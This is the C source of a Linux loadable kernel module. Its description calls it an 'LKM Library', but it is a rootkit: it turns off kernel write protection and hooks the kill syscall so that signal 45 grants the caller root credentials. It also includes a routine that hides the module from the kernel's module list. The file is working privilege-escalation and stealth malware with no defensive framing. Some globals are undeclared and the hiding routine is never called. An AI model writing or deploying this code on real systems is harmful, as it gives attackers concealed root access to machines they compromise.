#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched.h> 
#include <linux/err.h>  

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Trevohack");
MODULE_DESCRIPTION("LKM Library");


asmlinkage static notrace long hook_kill(pid_t pid, int sig)
{
    if (sig == 45) {
        set_root();
        return 0;
    }

    return orig_kill(pid, sig);
}

notrace void set_root(void)
{
    struct cred *creds;
    creds = prepare_creds();
    if (!creds) return;
    creds->uid.val    = creds->gid.val = 0;
    creds->euid.val   = creds->egid.val = 0;
    creds->suid.val   = creds->sgid.val = 0;
    creds->fsuid.val  = creds->fsgid.val = 0;
    commit_creds(creds);
}

static notrace void hideme(void) {
    struct module *mod;
    mod = THIS_MODULE;
    if (mod) {
        list_del(&mod->list);
    }
}


notrace static int rootkit_init(void)
{
    sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) {
        return -1;
    }

    write_cr0(read_cr0() & (~0x00010000));
    orig_kill       = (void *) sys_call_table[__NR_kill];
    sys_call_table[__NR_kill]    = (unsigned long) hook_kill;

    write_cr0(read_cr0() | 0x00010000);
    return 0;
}

notrace static void rootkit_exit(void)
{

    write_cr0(read_cr0() & (~0x00010000));
    sys_call_table[__NR_kill]       = (unsigned long) orig_kill;
    write_cr0(read_cr0() | 0x00010000);
}




module_init(rootkit_init);
module_exit(rootkit_exit);

